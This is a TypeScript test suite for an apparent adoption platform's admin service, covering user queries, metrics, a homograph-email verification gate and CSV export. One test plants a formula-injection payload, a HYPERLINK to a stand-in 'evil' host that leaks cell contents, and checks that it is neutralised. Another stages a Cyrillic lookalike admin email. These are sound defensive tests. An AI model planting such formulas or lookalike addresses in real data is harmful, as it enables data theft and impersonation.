import { vi, describe, it, expect, beforeEach, afterEach } from 'vitest';
import sequelize from '../../sequelize';

// Mock only external services
vi.mock('../../services/auditLog.service', () => ({
  AuditLogService: {
    log: vi.fn().mockResolvedValue(undefined),
    getLogs: vi.fn().mockResolvedValue({ rows: [], count: 0 }),
  },
}));

// Mock logger
vi.mock('../../utils/logger', () => ({
  __esModule: true,
  default: {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  },
  logger: {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  },
  loggerHelpers: {
    logBusiness: vi.fn(),
    logDatabase: vi.fn(),
    logPerformance: vi.fn(),
    logExternalService: vi.fn(),
  },
}));

import User, { UserStatus, UserType } from '../../models/User';
import Rescue from '../../models/Rescue';
import Pet, { PetStatus } from '../../models/Pet';
import Application from '../../models/Application';
import AdminService from '../../services/admin.service';

describe('AdminService', () => {
  beforeEach(async () => {
    await sequelize.sync({ force: true });
    vi.clearAllMocks();
  });

  afterEach(async () => {
    await User.destroy({ where: {}, truncate: true, cascade: true });
    await Rescue.destroy({ where: {}, truncate: true, cascade: true });
    await Pet.destroy({ where: {}, truncate: true, cascade: true });
    await Application.destroy({ where: {}, truncate: true, cascade: true });
  });

  describe('User Management', () => {
    it('should return paginated list of users', async () => {
      await User.create({
        userId: 'user-1',
        firstName: 'John',
        lastName: 'Doe',
        email: 'john@example.com',
        password: 'hashedPassword123!',
        status: UserStatus.ACTIVE,
        userType: UserType.ADOPTER,
        emailVerified: true,
      });

      await User.create({
        userId: 'user-2',
        firstName: 'Jane',
        lastName: 'Smith',
        email: 'jane@example.com',
        password: 'hashedPassword123!',
        status: UserStatus.ACTIVE,
        userType: UserType.ADOPTER,
        emailVerified: true,
      });

      const result = await AdminService.getUsers({ page: 1, limit: 10 });

      expect(result.users).toHaveLength(2);
      expect(result.total).toBe(2);
      expect(result.page).toBe(1);
      expect(result.totalPages).toBe(1);
    });

    it('should filter users by status', async () => {
      await User.create({
        userId: 'user-1',
        firstName: 'Active',
        lastName: 'User',
        email: 'active@example.com',
        password: 'hashedPassword123!',
        status: UserStatus.ACTIVE,
        userType: UserType.ADOPTER,
        emailVerified: true,
      });

      await User.create({
        userId: 'user-2',
        firstName: 'Suspended',
        lastName: 'User',
        email: 'suspended@example.com',
        password: 'hashedPassword123!',
        status: UserStatus.SUSPENDED,
        userType: UserType.ADOPTER,
        emailVerified: true,
      });

      const result = await AdminService.getUsers({ status: UserStatus.SUSPENDED });

      expect(result.users).toHaveLength(1);
      expect(result.users[0].status).toBe(UserStatus.SUSPENDED);
    });

    it('should filter users by user type', async () => {
      await User.create({
        userId: 'user-1',
        firstName: 'Adopter',
        lastName: 'User',
        email: 'adopter@example.com',
        password: 'hashedPassword123!',
        status: UserStatus.ACTIVE,
        userType: UserType.ADOPTER,
        emailVerified: true,
      });

      await User.create({
        userId: 'user-2',
        firstName: 'Rescue',
        lastName: 'Staff',
        email: 'staff@example.com',
        password: 'hashedPassword123!',
        status: UserStatus.ACTIVE,
        userType: UserType.RESCUE_STAFF,
        emailVerified: true,
      });

      const result = await AdminService.getUsers({ userType: UserType.RESCUE_STAFF });

      expect(result.users).toHaveLength(1);
      expect(result.users[0].userType).toBe(UserType.RESCUE_STAFF);
    });
  });

  describe('Platform Statistics', () => {
    it('should get platform statistics successfully', async () => {
      // Create test data
      await User.create({
        userId: 'user-1',
        firstName: 'Test',
        lastName: 'User',
        email: 'test@example.com',
        password: 'hashedPassword123!',
        status: UserStatus.ACTIVE,
        userType: UserType.ADOPTER,
        emailVerified: true,
      });

      await Rescue.create({
        name: 'Test Rescue',
        email: 'rescue@example.com',
        phone: '555-0123',
        address: '123 Main St',
        city: 'London',
        postcode: 'SW1A 1AA',
        country: 'GB',
        contactPerson: 'John Doe',
        status: 'verified',
      });

      const result = await AdminService.getPlatformMetrics();

      expect(result).toBeDefined();
      expect(result.users.total).toBeGreaterThanOrEqual(1);
      expect(result.rescues.total).toBeGreaterThanOrEqual(1);
    });
  });

  describe('verifyUser (mixed-script email gate)', () => {
    it('rejects verification when the email local part mixes scripts', async () => {
      // Pass-9 blocks mixed-script emails at registration via the
      // User model's beforeValidate hook, but user.update({
      // emailVerified: true }) doesn't trigger that hook. Without
      // an explicit gate here, an admin could mark a homograph
      // email as verified anyway. The verifyUser path re-checks
      // the local part and refuses.
      //
      // To stage a mixed-script email past registration (so we
      // can test the admin path itself), bypass the hook with
      // { hooks: false } — this is the same way a row could end
      // up in production if it predates the gate or comes in via
      // a future migration/import.
      const mixedScriptEmail = 'аdmin@example.com'; // leading 'а' is Cyrillic U+0430
      const user = await User.create(
        {
          userId: 'user-mixed-1',
          firstName: 'Mixed',
          lastName: 'Script',
          email: mixedScriptEmail,
          password: 'hashedPassword123!',
          status: UserStatus.ACTIVE,
          userType: UserType.ADOPTER,
          emailVerified: false,
        },
        { hooks: false }
      );

      await expect(AdminService.verifyUser(user.userId, 'admin-1')).rejects.toThrow(
        /mixed-script email/
      );

      const after = await User.findByPk(user.userId);
      expect(after?.emailVerified).toBe(false);
    });

    it('verifies a user whose email local part is single-script', async () => {
      const user = await User.create({
        userId: 'user-clean-1',
        firstName: 'Clean',
        lastName: 'Email',
        email: 'clean@example.com',
        password: 'hashedPassword123!',
        status: UserStatus.ACTIVE,
        userType: UserType.ADOPTER,
        emailVerified: false,
      });

      await AdminService.verifyUser(user.userId, 'admin-1');

      const after = await User.findByPk(user.userId);
      expect(after?.emailVerified).toBe(true);
    });
  });

  describe('Error Handling', () => {
    it('should handle errors in getUsers gracefully', async () => {
      await expect(AdminService.getUsers({ page: -1, limit: 0 })).resolves.toBeDefined();
    });

    it('should handle errors in platform metrics gracefully', async () => {
      const result = await AdminService.getPlatformMetrics();
      expect(result).toBeDefined();
    });
  });

  describe('CSV export formula injection', () => {
    it('neutralizes leading formula triggers in user-controlled fields', async () => {
      await User.create({
        userId: 'user-csv',
        firstName: '=HYPERLINK("http://evil/?p="&A1,"click")',
        lastName: 'Doe',
        email: 'csv-injection@example.com',
        password: 'hashedPassword123!',
        status: UserStatus.ACTIVE,
        userType: UserType.ADOPTER,
        emailVerified: true,
      });

      const csv = await AdminService.exportData('users', 'csv');

      // The formula trigger must be neutralized with a leading single quote
      // BEFORE the RFC-4180 quote wrapping (commas in HYPERLINK trigger wrapping).
      expect(csv).toContain('"\'=HYPERLINK');
      // Sanity: an un-neutralized payload would appear without the leading '.
      expect(csv).not.toContain('"=HYPERLINK');
    });
  });
});
